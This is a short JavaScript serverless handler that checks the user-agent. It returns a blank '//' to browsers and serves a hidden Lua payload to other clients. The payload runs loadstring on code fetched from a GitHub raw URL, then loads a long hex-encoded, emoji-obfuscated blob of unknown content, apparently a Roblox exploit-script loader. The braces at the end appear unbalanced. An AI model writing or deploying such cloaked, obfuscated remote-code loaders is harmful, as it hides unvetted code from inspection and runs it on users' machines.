exports.handler = async function(event, context) {
  const ua = (event.headers && (event.headers["user-agent"] || event.headers["User-Agent"])) || "";
  const isBrowser = ua.includes("Mozilla") || ua.includes("Chrome") || ua.includes("Safari");

  if (isBrowser) {
    return {
      statusCode: 200,
      headers: { "Content-Type": "text/plain" },
      body: "//"
    };
  }

  return {
    statusCode: 200,
    headers: { "Content-Type": "text/plain" },
    body: `loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/refs/heads/main/XOR%20Encoder%20Source'))()load("f09f96a420f09f929920f09f918920f09f96a420e29da4efb88f20f09f918920f09f929b20f09f929b20f09f918920f09f929b20f09fa7a120f09f918920f09f929c20f09f929a20f09f918920f09f929c20f09fa48e20f09f918920f09fa7a120f09f96a420f09f918920f09f96a420f09fa48d20f09f918920f09f929b20f09f929b20f09f918920f09f929b20f09f929920f09f918920f09f929a20f09f918920f09f96a420f09f929a20f09f918920f09f929b20f09f929920f09f918920f09f96a420f09fa48d20f09f918920f09f929b20e29da4efb88f20f09f918920f09fa48d20f09f918920f09fa48e20f09f929920f09f929920f09f918920f09f929c20f09fa7a120f09f918920f09f929c20f09fa48e20f09f918920f09f929c20f09fa48e20f09f918920f09fa48e20f09fa48e20f09f929a20f09f918920f09f929b20f09fa48d20f09f918920f09fa7a120f09f929a20f09f918920f09f929a20f09f918920f09f929920f09fa7a120f09f918920f09f96a420f09fa48e20f09f918920f09fa7a120f09f929b20f09f918920f09fa7a120f09f96a420f09f918920f09f929c20f09fa48d20f09f918920f09fa7a120f09f929a20f09f918920f09f929920f09f918920f09f929920f09f929b20f09f918920f09f929920e29da4efb88f20f09f918920f09fa7a120f09f929b20f09f918920f09f929b20f09f929c20f09f918920f09f929c20f09f929820f09f918920f09f929b20f09f96a420f09f918920f09f96a420f09fa48d20f09f918920f09f929b20f09f929a20f09f918920f09f929c20f09fa48d20f09f918920f09fa48d20f09fa48e20f09f918920f09f929b20f09f929b20f09f918920f09fa7a120f09fa7a120f09f918920f09f929c20f09f929920f09f918920f09f929920f09f929b20f09f918920f09fa48e20f09f929820f09f929920f09f918920f09fa48e20f09f929820f09f929920f09f918920f09fa48e20f09fa48e20f09fa7a120f09f918920f09fa48e20f09fa48e20f09f929920f09f918920f09f929c20f09fa48d20f09f918920f09f929b20f09fa7a120f09f918920f09f929c20e29da4efb88f20f09f918920f09fa48e20f09f929920f09f929920f09f918920f09fa48d20f09f929820f09f918920f09f929c20f09f929a20f09f918920f09f929b20f09fa48d20f09f918920f09f929c20f09f96a420f09f918920f09fa48e20f09f929c20f09f918920f09fa48d20f09f929820f09f918920f09f929920f09f96a420f09f918920f09fa48d20f09f929820f09f918920f09f929920f09f929b20f09f918920f09fa48e20f09fa48d20")`
    };
  };
};
